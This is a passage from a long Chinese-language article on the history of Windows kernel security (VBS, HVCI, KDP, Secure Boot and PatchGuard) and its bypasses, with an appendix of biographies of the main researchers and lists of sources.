**VTL1：安全世界与安全内核**。VTL1 里跑两样东西。其一是 **secure kernel（安全内核，镜像为 securekernel.exe）**：一个体量很小、功能刻意做窄的独立内核，跑在 VTL1 的 ring 0。它不取代 NT 内核——调度、文件系统、驱动模型这些重活仍归 NT 内核；它只托管少数裁决类服务：代码完整性（CI）的最终裁决、KDP 受保护内存的登记与校验、VTL1 侧的内存保护设定。其二是 **IUM（Isolated User Mode，隔离用户模式）进程**，又称 trustlet：跑在 VTL1 的 ring 3 的少数签名进程，例如承载 Credential Guard 的 LsaIso——秘密（凭据、密钥材料）放在它的地址空间里，VTL0 连读都读不到，调试器也附不上去。安全内核的价值恰恰在于小：可信计算基（TCB）从 NT 内核的数千万行代码，缩到 hypervisor + 安全内核这一小块，审计与出错面完全不是一个量级。

**两个世界之间如何切换**。执行转移只有三条合法路径，全部经 hypervisor 中转，没有任何"直接跳过去"的办法：

- **VTL call（向上调用）**：VTL0 的 ring 0 代码（且只能是 ring 0，低特权级发起会被 hypervisor 注入 #UD 异常）执行 hypercall 页里的调用序列，发出 **HvCallVtlCall** hypercall → 触发 VM exit，执行流进入 hypervisor（VMX root 模式、物理 CPU 不变、仍是同一个虚拟处理器）→ hypervisor 保存 VTL0 的私有处理器状态（每 VTL 一套独立的寄存器上下文，含各自的 CR3、RIP/RSP、中断控制器状态），装载 VTL1 的私有状态 → VM entry，执行流在 VTL1 的安全内核入口处继续。说人话：这是一次"借道最高层"的函数调用，门房（hypervisor）先把下层世界的现场封存，再放上层世界的现场出来。
- **VTL return（向下返回）**：反向同理，但有一条死规矩：**只能由高层自愿发起 HvCallVtlReturn 返回，低层永远不能抢占高层**。VTL1 处理完裁决后主动返回，hypervisor 恢复 VTL0 现场，调用方像经历了一次普通函数返回一样继续跑。
- **安全中断与拦截（被动进入）**：定向给高层的中断（secure interrupt），或低层触碰了受监控资源（如被保护的 MSR、被设了保护的内存页）触发 intercept 时，hypervisor 直接把执行流送进 VTL1 处理——相当于硬件帮高层"接管现场"，处理完仍走 VTL return 回去。

**内存如何隔离：SLAT 的角色**。地址翻译在这里是两段接力：第一段 GVA→GPA（客户虚拟地址到客户物理地址），由客户页表完成、CR3 在 VTL0 手里，内核想怎么改都行；第二段 GPA→SPA（客户物理地址到系统真实物理地址），由 **SLAT** 完成——Intel 叫 EPT（Extended Page Tables）、AMD 叫 NPT（Nested Page Tables）——这套页表**只有 hypervisor 能写**，且 hypervisor 按 VTL 分开维护（KDP 的实现说明里明确写了 hypervisor 为每个 VTL 维护独立的 SLAT 表）。最终访问权限是两段的交集：第一段给得再宽，第二段说不许写，就是写不进去。VTL1 设定保护的方式，是安全内核发出 **HvCallModifyVtlProtectionMask** hypercall，请 hypervisor 把某些 GPA 页在 VTL0 的 SLAT 视图里标成只读/不可执行/不可见——据微软 KDP 技术说明，**这个 hypercall 全系统只有安全内核有资格发出**。VTL0 对某个受保护页的违规访问会在硬件层触发 EPT/NPT violation → VM exit 到 hypervisor → hypervisor 依规矩向当前虚拟处理器注入访问违规异常，在 VTL0 里表现为访问违例乃至蓝屏——根本轮不到 VTL0 的代码出面"求情"。此外还有 MBEC（Mode-Based Execution Control，基于模式的执行控制）：把"可执行"拆成内核态可执行与用户态可执行两份，正是它让"只管内核代码、放行用户代码"这种按 ring 区分的 HVCI 策略成为可能。

### HVCI：把"改代码"这个动作从物理上禁掉

**定义**。HVCI（Hypervisor-Protected Code Integrity，hypervisor 保护的代码完整性），在 Windows 设置界面里叫**内存完整性（Memory Integrity）**，最初随 Device Guard 一同发布。它是什么：一项建在 VBS 之上的功能，把**内核代码完整性（KMCI）的裁决从 NT 内核里搬进 VTL1 的安全内核**，并让 hypervisor 用 SLAT 把裁决结果变成硬性的内存权限。它做什么用：保证两条铁律——内核内存页**只有在通过代码完整性检查之后才被允许变成可执行**，且**可执行的页永远不可写**（即 W^X：一个页要么可写、要么可执行，永不同时）。为什么要有它：把攻防史的语言翻译过来——PatchGuard 时代的全部绕过，归根结底都建立在"ring 0 代码能改 ring 0 代码"这一条之上（改 SSDT、挂钩函数、往内核里塞 shellcode）。签名强制只管加载那一刻，加载完之后代码在内存里被谁改了它不管。HVCI 的思路是釜底抽薪：不监视"改"这个行为，直接取消"能改"这个能力。

**机制：一段内核代码的一生**。驱动加载时，执行流仍在 VTL0：CI.dll 做常规验签与策略匹配；到了要把驱动的代码页设为可执行这一步，裁决权交给 VTL1——经 VTL call 进入安全内核（转移方式同上一节：hypercall → VM exit → hypervisor 换 VTL1 上下文），安全内核复核签名与企业/系统 CI 策略，裁决"可执行"后发出 ModifyVtlProtectionMask hypercall，请 hypervisor 在 VTL0 的 SLAT 视图里把这些页标成**只读 + 可执行**；随后 VTL return 回到 VTL0，驱动代码开始运行。注意一个常被误解的点：**内核代码本体仍然在 VTL0 里跑**，搬进 VTL1 的只是"发执行许可证"的权力。运行之后，VTL0 的任何代码——包括被攻破的内核本身——试图写这些代码页，都会撞上 SLAT 的写禁：EPT violation、VM exit、异常注入，写入根本落不了地。想新造一段可执行内存也一样：内核分配的页默认不可执行，想翻成可执行必须再过一遍 VTL1 的验签裁决；未签名的数据永远变不成代码。杀软、漏洞驱动、rootkit 在这里面对的不是一名巡逻的哨兵，而是一面没有门的墙。

**与 PatchGuard 的分工：预防制对检测制**。这两者经常被并列，其实是两种哲学：

- **HVCI 是预防制**：坏事发生之前就把可能性掐掉——不验签的代码进不了可执行状态，已验签的代码页动不了分毫。它覆盖的是**代码**：函数体、驱动镜像、回调指向的代码。
- **PatchGuard 是检测制**：坏事可以先发生，但巡逻的哨兵事后对账，对不上就掀桌（0x109 蓝屏）。它覆盖的清单里一大半是**数据**：IDT、GDT、SSDT 这类表、回调链表、进程链表、调试例程指针……

**HVCI 为什么对数据结构看护无能为力**——这是它不能取代 PatchGuard 的根本原因。数据与代码的区别在于：数据**生来就必须可写**。进程链表每创建一个进程就要改，回调链表每次注册注销都要改，IDT 之外的绝大多数内核全局变量都在不停地变。SLAT 只能回答"这一页许不许写"，没法回答"这一次写入的值对不对"——把数据页设成只读，系统当场就瘫了；设成可写，拿到 ring 0 写原语的攻击者往链表里摘一个进程、往回调表里换一个指针，SLAT 看来全是合法写入，无从拦起。要判断"值对不对"，只能有一个懂语义的检查者定期对账——这正是 PatchGuard 干了二十年的活。所以格局是：**代码面归 HVCI 用硬件权限硬封，数据面归 PatchGuard 用语义巡查盯守**，两者不是新老替代，而是分工互补。

**没有它会怎样、它挡不住什么**。没有 HVCI，就回到正文前四幕的世界：签名只守大门，门内的代码任人涂改，PatchGuard 独自与全副武装的同级对手打消耗战。它挡不住的也须说清：第一，**签名合法的有洞驱动**——验签验的是身份不是行为，一个证书齐全、代码原装的漏洞驱动能顺利拿到执行许可证（BYOVD），它在合法代码里触发的逻辑滥用，HVCI 无从分辨，这条路要靠 dbx 式黑名单与 IOMMU 等其他防线补；第二，**纯数据攻击**——不新增代码、不改代码、只改数据与控制流数据（如返回地址、函数指针）的打法，W^X 拦不住，这正是下一节 KDP 出场的原因（ROP 这类借用既有代码的技巧同理，归 CFG/CET 等控制流防线管，不归 HVCI）；第三，VTL1 与 hypervisor 本身若有洞，整座楼的地基就动了——TCB 缩小不等于 TCB 消失。

### KDP：给数据也配一个保险箱

**定义**。KDP（Kernel Data Protection，内核数据保护）是微软 2020 年 7 月公布的一项 VBS 家族技术：一组 API，让内核态软件把**自己选定的某些内存声明为"自此只读"**，由安全内核登记、由 hypervisor 用 SLAT 强制执行——从声明那一刻起，**任何 VTL0 实体（包括 NT 内核自己）都再也写不进这块内存**。为什么要有它：HVCI 封住了代码面之后，攻击面自然向数据面收缩——微软在 KDP 的公布说明里举的典型场景正是攻防史里出现过的：用签名合法的有洞驱动去改**代码完整性的策略数据结构**，把策略一改，再装未签名驱动，门禁形同虚设。策略变量这类数据的共同点是"初始化一次、此后只读"——天生适合锁进保险箱，KDP 就是为它们造的保险箱。它在整套架构里的位置因此很清楚：**HVCI 管可执行页，KDP 管被申报的非可执行数据，PatchGuard 管其余的一切**（微软亦明确 KDP 不碰可执行页，那是 HVCI 的地盘）。

**机制：静态与动态两条路**。静态 KDP 保护驱动**自家镜像里的一个数据节**：驱动调用 `MmProtectDriverSection`，VTL0 的内存管理器先做资格检查（不能是会话驱动、不能是大页映射等），把该节的页全部驻留并私有化、在客户页表里标只读，然后经 secure call 进入 VTL1——安全内核登记这些物理页、发出 ModifyVtlProtectionMask hypercall，由 hypervisor 在 VTL0 的 SLAT 视图里落下只读保护；代价写在明处：受保护的驱动默认**不可卸载**（要卸载须在调用时显式带 ALLOW_UNLOAD 标志）。动态 KDP 则是一个由安全内核管理的 **secure pool（安全池）**：驱动经扩展参数调用 `ExAllocatePool3` 从池中申请内存，附带 tag 与 cookie（用于事后核对指针有没有被偷换），把初始值写进去之后，这块内存就"只初始化一次"——此后对 VTL0 只读，想改必须在申请时预先声明 FREEABLE/MODIFIABLE 标志并接受安全性打折。据微软公开口径，KDP 的首批用户就包括系统自身的敏感策略数据与 Defender System Guard 的关键结构。

**挡不住什么**。KDP 是 opt-in（自愿申报）制：没人申报的数据它一概不管，而内核里绝大多数数据是**业务数据**——每时每刻都在合法变动，既不能也不该锁死。它的覆盖面至今只是关键策略与配置数据的一小块保留地，离"全内核数据只读化"相去甚远。换言之，KDP 是在 PatchGuard 的数据巡逻区里圈出了一小片改用硬隔离的特区，特区之外广袤的数据面，仍然只有巡逻制一种保护。

### 合起来看：五层防线的接力

把五节拼回攻防史的时间线，这条演进逻辑就完整了。**Secure Boot** 管的是"开机那几秒"：保证被交给执行权的第一批代码（固件驱动、bootmgfw、winload、内核）个个签名可查，把动手时机最早的那批人挡在门外——EfiGuard 必须先关它，恰好从反面标出了它的位置。**hypervisor** 管的是"地基"：它在所有人之前醒来，独占 SLAT，让'我比内核更高一级'从一句口号变成硬件事实。**VTL0/VTL1** 管的是"分权"：日常世界与裁决世界同机隔离，内核被攻破从"系统沦陷"降级为"一个世界沦陷"。**HVCI** 管的是"代码"：把 PatchGuard 苦守多年的清单里最要紧的那部分——内核代码本身——从巡逻保护升级为物理禁改。**KDP** 管的是"点状数据"：把最敏感的策略数据逐个搬进 VTL1 看守的保险箱。而这五层全加起来，仍然留着三块地没人接管：海量业务数据的语义对错、签名合法驱动的行为、以及 VTL1/hypervisor 自身的正确性——第一块，就是 PatchGuard 到 24H2 还在值班的原因。

### 本节来源（微软官方）

- 《Virtual Secure Mode》（Hyper-V TLFS 规范，VTL 层级、VTL call/return、内存保护与 MBEC）：https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm
- 《Memory Integrity and Virtualization-Based Security (VBS)》（Windows 驱动文档，内存完整性/HVCI 定义）：https://learn.microsoft.com/en-us/windows-hardware/drivers/bringup/device-guard-and-credential-guard
- 《Silicon assisted security》（Windows 安全书，VBS 安全内核与 HVCI）：https://learn.Microsoft.com/en-us/windows/security/book/hardware-security-silicon-assisted-security
- 《Firmware secure boot》（Azure 安全文档，PK/KEK/db/dbx 组件与流程）：https://learn.microsoft.com/en-us/azure/security/fundamentals/secure-boot
- 《Windows 8.1 Secure Boot Key Creation and Management Guidance》（PK/KEK/db/dbx 密钥管理）：https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/dn747883(v=win.10)?redirectedfrom=MSDN
- 《Secure Boot Overview》（启动顺序）：https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/hh824987(v=win.10)?redirectedfrom=MSDN
- 《Isolated User Mode (IUM) Processes》（VSM/SLAT 与 trustlet）：https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes
- 《Introducing Kernel Data Protection》（Microsoft Security Blog，2020-07-08，KDP 静态/动态实现与 SLAT 细节）：https://www.microsoft.com/en-us/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/

未钉死事项：hypervisor 与安全内核镜像在 winload 阶段的确切装载点与内部交接顺序，微软公开文档只给出"hypervisor 在系统初始化早期独占 MMU/IOMMU 控制权"的契约级描述，本节按契约陈述，未细化到镜像级步骤。

PatchGuard 没有被这套架构杀死，而是被它降格——从唯一的哨兵，变成纵深防线里仍在值班的一层。

**攻击侧对下沉的回应：赶在布防之前**。既然运行时越来越难，就回到启动时序上做文章。2018 年公开的 **EfiGuard**（作者 Mattiwatti）是这类路线的成熟代表：它是一个 UEFI 阶段的 DXE 驱动，在 Windows 启动链加载期间依次给 bootmgfw、winload、ntoskrnl 打补丁——在 PatchGuard 的初始化例程运行之前就先把它废掉，顺带处理签名强制；支持范围从 Vista SP1 一直到 Windows 11。它成立的前提恰好是上一幕埋的伏笔的反面：**必须关闭 Secure Boot**（或 Secure Boot 未开）。而 EfiGuard 自己的 README 里有一句最能说明时代变了的话：它**对 HVCI 无能为力**——"由于特权级差异"无法禁用 HVCI，即便关掉了 PatchGuard，"HVCI 仍会抓住 PatchGuard 以前抓的那些事"。哨兵被策反过一次之后，微软把新哨兵放到了更高的楼层。

## 第六幕（2019–今）：名单、数据面与常态化的猫鼠

**BYOVD 的工业化**：2019 年后，借签名漏洞驱动入门成为勒索软件与定向攻击的标准动作（先杀安全软件、再加密或窃密），社区侧则有 LOLDrivers 一类公开的"可滥用驱动"档案库与 KDU（Kernel Driver Utility）这样的通用工具，把"找一个还没被拉黑的签名驱动借道"做成了流水线。Capcom 式的万能钥匙还在不断被新厂商签发出来——这是生态问题，不是 PatchGuard 一个机制能解的。

**微软的平台级回应二：黑名单制度化**。微软维护的《漏洞驱动黑名单》（Microsoft Vulnerable Driver Blocklist，基于哈希）存在多年，但转折点在 **Windows 11 的 2022 更新：黑名单改为默认对所有设备开启**（官方文档口径），且在开启内存完整性（HVCI）时强制执行，并随 Windows 更新与大版本持续刷新。今天吊销一个驱动的证书仍是重武器（牵连同证书的全部合法软件），黑名单则提供了按文件哈希点杀的轻武器——**反制粒度从"厂商"细化到了"某一个驱动文件"**。

**微软的平台级回应三：KDP 把数据也搬进保险箱**。2020 年公布的 Kernel Data Protection（内核数据保护，KDP）让驱动可以把自己的关键数据结构声明为受 VBS 保护——这部分数据放在 VTL0 只读的页里，改它必须经 VTL1 的安全内核点头，连 ring 0 代码都不能直接写。这是冲着 PatchGuard 那个老盲区去的：**第二类感染（改动态数据）当年无感，现在开始有一块被硬隔离罩住的保留地**。覆盖范围还远谈不上全内核，但方向与 HVCI 一致——能搬进保险箱的，都不再靠巡逻保护。

**现在时**：PatchGuard 本人仍在服役、仍在每个 Windows 大版本里换一副面孔（公开分析一直跟到 Windows 11 24H2：初始化入口藏在体量最大的那个内核函数里、由 KeInitAmd64SpecificState 一路引到，细节继续变化）。但攻防的重心已经不在它身上：默认开启的 Secure Boot + HVCI + 黑名单把低成本路线逐条封死，公开研究更多转向数据面、VTL 边界与启动链的缝隙。PatchGuard 从当年的主角，变成了一道纵深防线里仍在值班的老哨兵。

## 收束：二十年攻防留下的三条规律

1. **同级对抗没有终局解，只有成本曲线。** 2005 年那篇论文的命题被二十年反复验证：ring 0 内部的防护，赢的是每一轮的成本与时滞，不是永久的安全。微软真正的解法从来不是把 PatchGuard 做得更强，而是**换图层**——把裁判从 ring 0 搬到 hypervisor、把信任链从运行时搬到启动链。
2. **每次反制都把战场推向更外围。** 堵住改内核，攻击转向借正牌驱动（BYOVD）；拉黑驱动，攻击转向启动期与更低层；防线下沉到固件与虚拟化层，攻防就跟到那里。看 PatchGuard 的历史，就是看 Windows 安全边界一步步外扩与下沉的历史。
3. **生态治理与技术对抗同等重要。** 若不是 2006 年那场谈判逼出了官方正门（回调、过滤框架、WFP），封内核只会逼出更多私下绕过；若不是黑名单这种"给生态留活路"的点杀手段，吊销证书的核武器根本不敢用。PatchGuard 一半是技术，一半是规则——这也是它留给今天所有平台安全设计的真正遗产。

## 附录一：人物谱

说明：本附录为正文涉及的专家人物补背景。事实只取公开可查来源；查不到或来源不可靠的，明确标注「公开资料未确认」，不作推断。职务、年份以来源发表时点为准，后续变迁未被可靠来源覆盖的同样标注。

### skape（Matt Miller）

skape 是真名 Matt Miller 的公开网名，身份有据可查。他是 Metasploit 框架的核心开发者之一，参与 Metasploit 3.0 开发，是 Meterpreter 载荷的主要架构者，也做过 VNC injection 等功能；同时是 Uninformed 期刊的共同创办者/编辑，长期写利用技术、逆向与程序分析类文章。在 PatchGuard 史上，他与 Skywing 合著 Uninformed 第 3 卷《Bypassing PatchGuard on Windows x64》（2005 年 12 月），这是第一份系统逆向 PatchGuard 的公开论文，归纳攻击面并逐条附微软可采取的修复建议。此前他还与 Skywing 合写过绕过硬件 DEP 的文章（2005）。2008 年他加入微软 Security Science 团队，做漏洞发现与缓解技术，公开履历提及他做过 Windows 2000/XP/2003 的 ASLR 功能实现与 SEHOP 缓解；2018 年 Black Hat 资料显示其职务已是 MSRC 的 Partner Security Software Engineer，负责主动漏洞防御策略与工程。其风格是典型的「攻防同体」：早年把利用写到极致，入职微软后把同一套知识转成缓解机制，影响延续到 Windows 缓解体系本身。

### Skywing（Ken Johnson）

Skywing 真名 Ken Johnson，公开身份可查。他的个人博客 Nynaeve 自述：他是 Windows 软件程序员，曾是 Microsoft SDK MVP，兴趣在 Windows 软件与驱动开发、调试、逆向；博客上连载的 x64 异常处理、TLS 等长文被 Raymond Chen 等人引用推荐（任务简报所说「著有 Windows 内核相关书籍」一条，公开资料未确认其有独立署名书籍，故不采，只记其博客与论文产出）。入行时他在 Positive Networks（一家 VPN 厂商）做开发，逆向是业余研究。在 PatchGuard 史上他是最核心的作者：2005 年与 skape 合著首破论文；Uninformed 第 6 卷独著《Subverting PatchGuard Version 2》，演示劫持 PatchGuard 自己的完整性检查例程；第 8 卷独著《PatchGuard Reloaded》，分析第 3 版。2009 年 3 月他加入微软，负责「漏洞、利用、防御与绕过防御」相关工作。其风格是把内部机制拆到指令级、且每讲一招破法就附一招堵法，这种写法使他的三篇 Uninformed 论文成为后人（包括 UPGDSED、EfiGuard）反复引用的参考文献源头。

### Joanna Rutkowska

Joanna Rutkowska，波兰安全研究者，华沙理工大学计算机硕士（据维基百科条目）。2006 年时她在新加坡安全公司 COSEINC 做研究，同年 Black Hat 演讲《Subverting Vista Kernel For Fun And Profit》让她成名：同一场里演示了绕过 Vista 驱动签名把未签名代码送进内核，以及用 AMD SVM 虚拟化把正在运行的系统整体抬进攻击者虚拟机的 Blue Pill。在 PatchGuard 史上，她的贡献不在某条绕过，而在坐标系：她提出的三类感染分类（改代码与静态结构、改动态数据、hypervisor 层）成了此后讨论 PatchGuard 盲区的标准语言；页面文件攻击则指出「准入（签名）与巡查（PatchGuard）之间还有磁盘上代码这条缝」。2007 年 4 月她在华沙创办 Invisible Things Lab（ITL），团队陆续做 Xen、Intel TXT/SMM 等攻击研究；2009 年她提出 Evil Maid 攻击。2010 年她转而「造」：发布 Qubes OS，以 Xen 虚拟机分仓隔离桌面生活，1.0 版 2012 年发布。其风格是从拆解转向架构——「不信任基础设施、用隔离代替信任」成为她后半程的标志。

### Alexander Tereshkin（90210）

Alexander Tereshkin，网名 90210。Black Hat 2007 的官方简介称他是资深逆向工程师、Windows 内核专家，专长 rootkit 技术与内核利用，此前做过个人防火墙绕过等研究；2006–2007 年间他在 COSEINC 的 Advanced Malware Labs 工作，主攻基于虚拟化的恶意软件与内核保护绕过。在 PatchGuard 史上，他是 Rutkowska 的搭档：两人合讲 Black Hat 2007《IsGameOver(), anyone?》，演示在运行中攻陷 Vista x64 内核的新方法，并把「糟糕的合法签名驱动可作跳板」这一后来被称为 BYOVD 的判断说透；两人还合开过 Black Hat 训练课「Understanding Stealth Malware」，涉及 Deepdoor、Firewalk、Blue Pill 一类样本的实现细节。之后他成为 ITL 的一号员工（employee #1）；Rutkowska 2010 年的博文记录，ITL 转向系统构建后，他选择离开、继续做他热爱的逆向与编译器黑客工作（文中提及他的变形代码生成器工作）。其 ITL 之后的职业去向，公开资料未确认。其风格偏纯粹的底层手艺人：对 rootkit 与虚拟化恶意软件的实现细节钻得极深，但公开露面远少于 Rutkowska。

### Satoshi Tanda（tandasat / standa_t）

Satoshi Tanda，GitHub 名 tandasat，社交名 standa_t，系统软件工程师与安全研究者。机构变迁有公开时点可依：2016 年 REcon 演讲时他是 Sophos 的威胁研究员，专长 Windows 行为检测；2017 年的公开演讲与论文署名已是 CrowdStrike 工程师；REcon 2022 讲师简介仍称其在 CrowdStrike 工作。在 PatchGuard 史上，他是「逐版本解剖」一线的代表：其博客在 2015 年前后对多个 Windows 版本的 PatchGuard 实现做连载式逆向（另有专门的 PgResarch 研究仓库），被同行广泛征引；更重要的是他反手做了防守工具——基于自研的 Intel VT-x 轻量 hypervisor 框架 HyperPlatform（开源），衍生出 GuardMon（从更低层监视 PatchGuard 活动）、MemoryMon、DdiMon 等工具，并在 REcon 2016、BlueHat 2016 演讲，2017 年与 Korkin 合著 ADFSL 论文用 MemoryMonRWX 检测内核 rootkit。他还长期在 REcon 开 hypervisor 开发训练课。其风格是「拆解与监控同源」：先逆向到能复述实现，再用 hypervisor 站到被监视者下面去。

### Igor Korkin

Igor Korkin，俄罗斯研究者，莫斯科工程物理学院（MEPhI）网络安全博士，自我定位为独立研究者，研究方向是内存取证、rootkit 检测与裸机 hypervisor；其 arXiv 论文《Applying Memory Forensics to Rootkit Detection》提出过 MASHKA 内存取证系统。在 PatchGuard 史上他出现在「防守反击」一侧：他自述读到 Tanda 的 PatchGuard 绕过研究后主动联系对方，提出「用 hypervisor 监控、控制内存访问来保护 PatchGuard」；两人 2016 年在 REcon 合讲 HyperPlatform，2017 年在 ADFSL 合著论文，用基于 HyperPlatform 的 MemoryMonRWX 检测内核 rootkit（正文将其列为 Turla 链的分析来源之一，其论文本体主题是检测方法，非 Turla 归因）。此后他独立发展 MemoryRanger——把驱动放进隔离内核空间的 hypervisor，在 Black Hat Europe 2018、ADFSL 等场合发表，思路与微软后来的 Kernel Data Protection 相呼应。其风格是学术型防守者：发论文、做原型，把「站在更低层保护内核内存」做成个人长期课题。

### Mattiwatti

Mattiwatti 是 GitHub 账号名，真实身份未公开——其 GitHub 主页与公开报道中均无可核实的真名与机构信息，故本条只记网名与作品，不猜身份。在 PatchGuard 史上，他是启动期路线的代表作者：2018 年公开、2019 年建仓 GitHub 的 EfiGuard 是一个可移植的 x64 UEFI bootkit，在 Windows 启动链加载期间依次给 bootmgfw、winload、ntoskrnl 打补丁，在 PatchGuard 初始化之前就将其禁用并顺带处理驱动签名强制，支持范围自 Vista SP1 到 Windows 11；实现上大量使用 Zydis 做运行时指令解码而非特征码匹配，以扛版本变化。EfiGuard 的 README 同时写明其边界：因特权级差异无法禁用 HVCI，这一自述成了正文「战场下沉」一幕的注脚。该工具的影响溢出研究圈：Palo Alto Networks Unit 42 在 2024 年的分析中记录，Glupteba 恶意软件把改编后的 EfiGuard 纳入其 UEFI bootkit 武器库。其风格是工程完成度取向：不发论文、不开演讲，只交一个跨十余个 Windows 版本可用的完整工具与详尽文档。

### EP_X0FF（hfiref0x）

EP_X0FF 是网名，GitHub 账号 hfiref0x，真实身份未公开，公开资料亦未确认其机构背景，故只记作品。他是 Windows 底层绕过技术的「工具编目者」：在 GitHub 长期维护 UACMe（UAC 绕过方法合集）、WinObjEx64、DSEFix、系统调用表等仓库。在 PatchGuard 史上，他与 Fyyre 合著 UPGDSED（Universal PatchGuard and Driver Signature Enforcement Disable，2017–2018），把 Fyyre 的启动期禁用思路做成带完整源码的通用工具，其 README 的参考文献明确上溯 Skywing 2005 年论文与 Fyyre 的 bootloader 文本；该项目 2018 年宣布弃更并把仓库只读存档，README 指引后人改用 EfiGuard。后续他又做了 KDU（Kernel Driver Utility），把「借一个合法签名的漏洞驱动获得内核读写、再加载未签名驱动」的 BYOVD 流程工具化、流水线化——这正是正文末幕的代表工具。Unit 42 的分析也记录 UPGDSED 曾被 Glupteba 等恶意软件实际使用。其风格是把散落的研究结论沉淀为带说明、带引用、带版本维护的公共工具箱，因此在攻防两端都被反复引用。

### Fyyre

Fyyre 是网名，真实身份未公开：个别二手转帖称其为「Daniel」，但无可靠一手来源证实，本条不采，只记网名。其活动阵地是个人站点 fyyre.ru 与汇编、逆向社区（如 flat assembler 论坛、Exetools 论坛）。在 PatchGuard 史上，他是「启动期一键禁用」路线的开创者：其文本《Disable PatchGuard — the easy/lazy way》（末次更新 2011 年 3 月，据转帖所附原文）给出不用驱动、改 winload 与 ntoskrnl 副本并配合 BCD 新建启动项的完整步骤，标题的自嘲（easy/lazy）正是其风格注脚；后续他又出了更新到 Win7/Win8 的 bootloader_v2 文本与 MBR bootkit 版 bootkit_fasm。他在 Exetools 论坛的自述（论坛帖，属本人发言、二手场合）称：UPGDSED 是他与 hfiref0x 基于他的「禁用 PG/DS」思路与研究共同创建的；同一帖中他还说自己已主要转向 Linux、不再用新版微软产品，因此无意为 Windows 8 开发新版——这解释了 UPGDSED 为何止步于 2018 年弃更。其风格是地下社区式的极简主义：不写长篇论文，一份 txt、一包源码把事情做完，影响却经 UPGDSED 与 EfiGuard 的引用链一路传到今天。

### Stephen Toulouse（Stepto）

Stephen Toulouse（1972–2017），网名 Stepto。须先纠一处职务口径：正文称其为微软「安全技术部门负责人」，公开报道的准确职务是 Security Technology Unit 高级产品经理，此前是 MSRC 沟通负责人，并非部门总负责人，以核查结果为准。他 1994 年入微软，起初做技术写作与培训；2002 年 11 月加入 MSRC，第一仗就是 2003 年 1 月的 Slammer 蠕虫，此后经手 Blaster、Sasser 等事件的对外沟通，以坦率著称。在 PatchGuard 史上他是微软一方的「发言人角色」：2006 年 Vista 内核争端中，他代表微软回应 Symantec 与 McAfee 的指控，解释为何封内核、为何只给 API 不许挂钩；Skywing 指控微软用热修复给自家产品开后门时，也是他出面反驳，称政策已在 2006 年 10 月修订。2007 年 8 月他转入 Xbox Live 团队，2009 年升任政策与执法总监，成为玩家口中的「Banhammer」；2012 年离开微软，后在 HackerOne、HBO 等处任职并做安全顾问，2017 年 10 月 26 日去世，年 45 岁。他不是工程师型人物，而是把这场技术争端变成公共叙事的人——正文里微软的立场，大半经他的口说出。

---

### 本附录来源

- skape（4）：Uninformed 全集目录 http://uninformed.org/?v=all ；Dark Reading 入职微软报道 https://www.darkreading.com/cyber-risk/microsoft-snags-another-security-researcher ；Black Hat USA 2018 讲者页 https://blackhat.com/us-18/speakers/Matt-Miller.html ；Ruxcon Breakpoint 讲者简介 https://ruxconbreakpoint.com/speakers/
- Skywing（4）：Nynaeve 自述 http://www.nynaeve.net/?page_id=2 ；Threatpost 入职微软报道（2009-03-25）https://threatpost.com/ken-skywing-johnson-joins-microsoft-security-team-032509/72482/ ；ZDNet 报道 https://www.zdnet.com/article/microsoft-adds-skywing-to-windows-defense-team/ ；BetaNews 关于 Symantec 白皮书引用其论文的报道 https://betanews.com/article/symantec-vista-white-paper-links-to-patchguard-crack/
- Rutkowska（4）：维基百科条目 https://en.wikipedia.org/wiki/Joanna_Rutkowska ；Invisible Things Blog 自述 https://blog.invisiblethings.org/about/ ；RadicalxChange 讲者简介 https://www.radicalxchange.org/speakers/joanna-rutkowska/ ；The Register 2007 年 Vista 安全报道 https://www.theregister.com/off-prem/2007/01/31/vista-raises-the-bar-for-flaw-finders/775434
- Tereshkin（3）：Black Hat USA 2007《IsGameOver(), anyone?》简介存档 https://en.zarza.com/podcasts/black-hat-briefings-usa-2007-audio-presentations-from-the-security-conference-3236962/episodio/joanna-rutkowska-alexander-tereshkin-isgameover-anyone/ ；ITL 博文《Understanding Stealth Malware》https://blog.invisiblethings.org/2007/04/20/understanding-stealth-malware.html ；ITL 博文《Evolution》（2010，记其离职）https://blog.invisiblethings.org/2010/05/01/evolution.html
- Tanda（5）：REcon 2016 演讲幻灯 https://recon.cx/2016/resources/slides/RECON-0xA-HyperPlatform-Satoshi.pdf ；REcon 2022 训练课讲师简介 https://www.recon.cx/2022/traininghypervisordevelopment.html ；HyperPlatform 用户文档 https://tandasat.github.io/HyperPlatform/userdocument/index.html ；2017 年 CrowdStrike 演讲幻灯 https://www.slideshare.net/codeblue_jp/powershell-inside-out-applied-net-hacking-for-enhanced-visibility-by-satoshi-tanda ；ADFSL 2017 合著论文 https://fetcher.alphaxiv.org/v2/pdf/1705.06784v1.pdf
- Korkin（4）：REcon 2016 演讲幻灯（同 Tanda 条）；arXiv 论文及作者简介 https://arxiv.org/pdf/1506.04129 ；ADFSL 2019 MemoryRanger 幻灯 https://raw.githubusercontent.com/IgorKorkin/research/main/2019/CDFSL2019-slides-MemoryRanger-Prevents-Hijacking-FILE_OBJECT-Structures-in-Windows-Kernel.pdf ；JDFSL 2021 论文条目 https://docslib.org/download/7176683/windows-kernel-hijacking-is-not-an-option-memoryranger-comes-to-the-rescue-again
- Mattiwatti（2）：GitHub EfiGuard 仓库 https://github.com/Mattiwatti/EfiGuard ；Unit 42《Diving Into Glupteba's UEFI Bootkit》https://unit42.paloaltonetworks.com/glupteba-malware-uefi-bootkit/?pdf=print&lg=en&_wpnonce=c0c1c1d2f3
- EP_X0FF（3）：UPGDSED 仓库 README（作者、参考文献、弃更说明）https://github.heygears.com/hfiref0x/UPGDSED ；hfiref0x 仓库清单（含 KDU、UACMe、DSEFix）https://theresanaiforthat.com/repositories/hfiref0x/ ；Unit 42 Glupteba 分析（同 Mattiwatti 条）
- Fyyre（3）：UPGDSED 仓库 README 参考文献（同 EP_X0FF 条）；《Disable PatchGuard — the easy/lazy way》原文转帖 https://topic.alibabacloud.com/a/windows-x64-patch-guard_1_15_30881561.html ；Exetools 论坛本人发言帖 https://forum.exetools.com/showthread.php?p=130948&nojs=1
